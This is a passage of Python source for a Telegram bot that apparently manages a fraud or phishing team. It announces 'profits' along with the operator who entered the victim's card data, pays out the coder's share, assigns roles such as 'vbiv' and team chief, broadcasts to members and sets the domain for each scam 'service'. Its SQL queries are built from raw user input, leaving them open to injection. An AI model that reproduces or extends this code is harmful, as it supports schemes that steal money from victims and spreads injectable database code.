    bot.send_message(chatWorks, f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {msg}{p}\n\n👤Вбил: @{message.from_user.username}</b>")
    bot.send_message(chatCoder,f"🎉Новый профит у {botName}🎉\n🧶Твоя доля: {int(coderss)} $ {cod} {p}")
    bot.send_message(message.chat.id, 'Готово')


def infoloh(message):
    try:
        idl = int(message.text)
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT id FROM users WHERE id = {idl}")
        data = sql.fetchone()
        if data is None:
            bot.send_message(message.chat.id,"<b>🚷Пользователь не найден</b>")
        else:
            sql.execute(f"SELECT * FROM users WHERE id = {idl}")
            data = sql.fetchall()
            for name in data:
                id = name[0]
                user = name[1]
                tag = name[2]
                rate = name[3]
                cash = name[4]
                profit = name[5]
                meth = name[6]
            w = ["undefined",'baned',"worker", "top","support", "vbiv", "TC"]
            if rate == 0:
                stat = w[0] 
            if rate == 1:
                stat = w[2] 
            if rate == 2:
                stat = w[3] 
            if rate == 3:
                stat = w[4] 
            if rate == 4:
                stat = w[5] 
            if rate == 5:
                stat = w[6] 
            if rate == 9:
                stat = w[2] 
            markups = types.InlineKeyboardMarkup(row_width=2)
            but_1 = types.InlineKeyboardButton("🚫BAN", callback_data=f"setban_{id}")
            but_2 = types.InlineKeyboardButton("❇️UNBAN", callback_data=f"setunban_{id}")
            but_3 = types.InlineKeyboardButton("🦧Worker", callback_data=f"setwork_{id}")
            but_4 = types.InlineKeyboardButton("🤺TOP", callback_data=f"settop_{id}")
            but_5 = types.InlineKeyboardButton("👨‍⚕️Support", callback_data=f"setsup_{id}")
            but_6 = types.InlineKeyboardButton("🦹🏿‍♀️Vbiv", callback_data=f"setvbiv_{id}")
            but_7 = types.InlineKeyboardButton("👑TC", callback_data=f"settc_{id}")
            markups.add(but_1,but_2,but_3,but_4,but_5,but_6,but_7)
            bot.send_message(message.chat.id,f"<b>♿️Воркер: @{user}\n\n🥷Скрытый тег: #{tag}\n👁Статус: {stat}\n💸Баланс: {cash}$\n🚀Профитов: {profit}\n♻️Метод вывода: {meth}</b>",reply_markup=markups)

    except:
        pass


@bot.message_handler(content_types=['text'])
def keyboard(message):
    if message.text == "Главное меню":
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        db.commit()
        people_id = message.chat.id
        for i in sql.execute(f"SELECT rate FROM users WHERE id = {people_id}"):
            global rank
            rank = i[0]
        if rank == 0:
            bot.send_message(message.chat.id, 'Иди нахуй уёбок')
        if rank == 9:
            bot.send_message(message.chat.id, 'Иди нахуй уёбок')
        if rank >= 1 and rank < 9:
            start(message)

def setTah(message,id):
    try:
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        msg = message.text
        sql.execute(f'UPDATE users SET secretTah = "{msg}" WHERE id = {message.chat.id}')
        db.commit()
        bot.send_message(message.chat.id, f"🧬<b>Новый тег: #{msg} установлен</b>")
    except:
        bot.send_message(message.chat.id,'🩸<b>Ошибка!</b>')

def setmeth(message,id):
    try:
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        msg = message.text
        sql.execute(f'UPDATE users SET methodW = {msg} WHERE id = {message.chat.id}')
        db.commit()
        bot.send_message(message.chat.id, f"🧬<b>Новый метод: <code>{msg}</code> установлен</b>")
    except:
        bot.send_message(message.chat.id,'🩸<b>Ошибка!</b>')

def alertFunk(message):
    t = message.text
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    db.commit()
    sql.execute("SELECT id FROM users")
    exists = sql.fetchall()
    for i in exists:
        uid = i[0]
        try:
            bot.send_message(uid, f'{t}')
            time.sleep(0.005)
        except:
            pass


def setdomain(message,service):
    sdom = message.text
    dom = open(f'domain/{service}.txt', 'w')
    dom.write(sdom)
    dom.close()
    bot.send_message(message.chat.id, "Домен установлен")